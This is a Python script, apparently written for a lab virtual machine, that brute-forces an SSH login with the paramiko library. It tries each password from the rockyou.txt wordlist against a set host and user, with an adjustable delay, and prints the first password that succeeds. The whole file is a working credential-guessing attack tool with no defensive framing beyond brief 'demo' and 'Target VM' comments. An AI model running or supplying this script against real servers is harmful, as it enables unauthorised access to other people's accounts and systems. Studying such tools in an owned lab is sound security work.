import paramiko
import time
import sys

def attempt_ssh_login(target_ip, username, password):
    #Attempts SSH connection with paramiko
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        # Timeout is set to 3 seconds for demo
        client.connect(hostname=target_ip, username=username, password=password, timeout=3)
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        # print(f"[!] Connection Error: {e}")
        return None
    finally:
        client.close()

def start_hammer(ip, user, wordlist_path, delay):
    #Goes through rockyou.txt
    print(f"[*] Starting attack on {ip} as {user}...")
    
    try:
        with open(wordlist_path, 'r') as f:
            for line in f:
                password = line.strip()
                print(f"[~] Testing: {password}")
                
                result = attempt_ssh_login(ip, user, password)
                
                if result is True:
                    print(f"\n[+] SUCCESS! Password found: {password}")
                    return # Stop on entry
                
                # Adjustable delay
                time.sleep(delay) 
                
    except FileNotFoundError:
        print(f"[!] Error: Wordlist '{wordlist_path}' not found.")

if __name__ == "__main__":
    target_vm_ip = "192.168.56.101" # Replace with Target VM IP
    target_user = "victim_user"
    words = "rockyou.txt"
    timing = 1.5 # seconds between attempts
    
    start_hammer(target_vm_ip, target_user, words, timing)